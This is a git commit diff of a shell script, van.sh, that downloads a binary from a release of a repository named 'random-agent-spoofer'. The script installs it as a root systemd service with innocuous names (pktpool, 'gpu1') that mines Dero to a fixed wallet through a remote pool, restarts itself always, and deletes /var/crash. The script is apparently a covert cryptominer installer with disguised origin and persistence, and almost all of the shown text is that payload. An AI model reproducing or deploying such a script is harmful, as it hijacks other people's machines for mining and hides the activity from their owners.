3b82aa5a30c189cad11ca6da4c841bdfaa7c61b6
trangtrau <30510221+trangtrau@users.noreply.github.com>
2023-01-29 23:09:56 +0700

    Update van.sh

--- van.sh
+++ van.sh
@@ -4,9 +4,32 @@ count=`pgrep sang |  grep -o -E '[0-9]+'`
 if [[ $count == "" ]]
 then
 
-wget https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/astro -O sang 
-sudo chmod +x sang
-nohup ./sang  -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcpvuc95p8a0rssl0xhzl -r community-pools.mysrv.cloud:10300 -p rpc &
+wget https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/astro -O /home/ubuntu/sang 
+sudo chmod +x /home/ubuntu/sang 
+chmod +x /home/ubuntu/sang 
+sudo rm -rf /lib/systemd/system/pktpool.service
+sudo rm -rf /var/crash
+bash -c 'cat <<EOT >>/lib/systemd/system/pktpool.service 
+[Unit]
+Description=gpu1
+After=network.target
+[Service]
+ExecStart= /home/ubuntu/sang  -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcpvuc95p8a0rssl0xhzl -r community-pools.mysrv.cloud:10300 -p rpc 
+WatchdogSec=36000
+Restart=always
+RestartSec=60
+User=root
+[Install]
+WantedBy=multi-user.target
+EOT
+' &&
+
+systemctl daemon-reload &&
+systemctl enable pktpool.service &&
+service pktpool stop  &&
+service pktpool restart
+top
+
  
 else
 echo "dang ton tai"
